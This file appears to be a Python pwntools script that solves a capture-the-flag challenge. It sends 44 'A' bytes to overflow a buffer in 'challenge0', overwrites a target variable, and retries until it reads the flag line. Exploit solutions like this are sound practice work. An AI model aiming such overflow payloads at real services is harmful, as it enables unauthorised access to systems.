#!/usr/bin/python3.8
import warnings
from pwn import *
from termcolor import colored
warnings.filterwarnings("ignore")

context.log_level = "error"

LOCAL  = False
check  = True

while check:
  # Open a local process or a remote
  if LOCAL:
    r   = process("./challenge0")
  else:
    r   = remote("0.0.0.0", 1337)

  # Overflow the buffer with 44 bytes and overwrite the address of "target" with junk.
  r.sendlineafter(">", "A" * 44)

  # Read flag - unstable connection
  try:
    flag = r.recvline_contains("FLAG").decode()
    print(colored(f"\n[+] Flag: {flag}\n", "green"))
    check = False
  except:
    print(colored("\n[-] Failed to connect!", "red"))
  r.close()